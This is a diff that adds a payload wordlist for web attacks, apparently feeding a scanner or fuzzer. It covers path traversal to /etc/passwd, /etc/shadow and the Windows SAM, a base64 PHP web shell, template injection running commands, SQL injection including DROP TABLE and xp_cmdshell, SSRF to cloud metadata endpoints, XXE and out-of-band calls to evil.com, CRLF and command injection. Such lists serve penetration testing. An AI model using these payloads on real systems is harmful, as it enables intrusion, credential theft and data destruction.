@@ -1,0 +1,137 @@
+# LFI/Path Traversal Payloads
+../../../etc/passwd
+....//....//....//etc/passwd
+..%2f..%2f..%2fetc/passwd
+..%252f..%252f..%252fetc/passwd
+/etc/passwd
+../../../etc/shadow
+../../../etc/hosts
+../../../proc/self/environ
+../../../proc/version
+../../../proc/self/cmdline
+../../../var/log/apache2/access.log
+../../../var/log/apache/access.log
+../../../var/log/nginx/access.log
+../../../var/log/httpd/access_log
+..\\..\\..\\windows\\win.ini
+..\\..\\..\\windows\\system32\\config\\sam
+....\\\\....\\\\....\\\\windows\\win.ini
+C:\\windows\\win.ini
+C:\\windows\\system32\\drivers\\etc\\hosts
+php://filter/convert.base64-encode/resource=/etc/passwd
+php://filter/read=string.rot13/resource=/etc/passwd
+file:///etc/passwd
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
+expect://id
+input://data
+zip://path/to/file.zip%23dir/file.txt
+phar://path/to/file.phar/internal/file.txt
+
+# SSTI Payloads
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+{{7*'7'}}
+{{config}}
+{{self}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+${T(java.lang.Runtime).getRuntime().exec('id')}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+
+# XSS Payloads
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<input onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+</title><script>alert(1)</script>
+</textarea><script>alert(1)</script>
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+
+# SQLi Payloads
+' OR '1'='1
+' OR '1'='1' --
+" OR "1"="1
+' OR '1'='1' /*
+admin' --
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+1' ORDER BY 1--
+1' ORDER BY 10--
+1 AND 1=1
+1 AND 1=2
+1' AND '1'='1
+1' AND '1'='2
+1; DROP TABLE users--
+'; EXEC xp_cmdshell('dir')--
+' AND SLEEP(5)--
+' AND BENCHMARK(10000000,MD5('test'))--
+1' WAITFOR DELAY '0:0:5'--
+
+# SSRF Payloads
+http://127.0.0.1/
+http://localhost/
+http://[::1]/
+http://169.254.169.254/
+http://169.254.169.254/latest/meta-data/
+http://metadata.google.internal/computeMetadata/v1/
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://2130706433/
+http://0x7f000001/
+http://017700000001/
+http://127.1/
+http://0.0.0.0/
+file:///etc/passwd
+dict://127.0.0.1:11211/stats
+gopher://127.0.0.1:25/
+
+# Open Redirect Payloads
+//evil.com
+https://evil.com
+/\\evil.com
+\\evil.com
+//evil.com/%2f..
+///evil.com
+////evil.com
+https:evil.com
+https:/evil.com
+//evil.com?.legitimate.com
+//evil.com#.legitimate.com
+javascript:alert(1)
+
+# CRLF Payloads
+%0d%0aSet-Cookie:crlfinjection=true
+%0d%0aLocation:http://evil.com
+%0aSet-Cookie:crlfinjection=true
+%0dSet-Cookie:crlfinjection=true
+\r\nSet-Cookie:crlfinjection=true
+
+# XXE Payloads
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><foo></foo>
+
+# Command Injection Payloads
+; id
+| id
+|| id
+& id
+&& id
+`id`
+$(id)
+; cat /etc/passwd
+| cat /etc/passwd
+; whoami
+| whoami
+; sleep 5
+| sleep 5
+; ping -c 5 evil.com
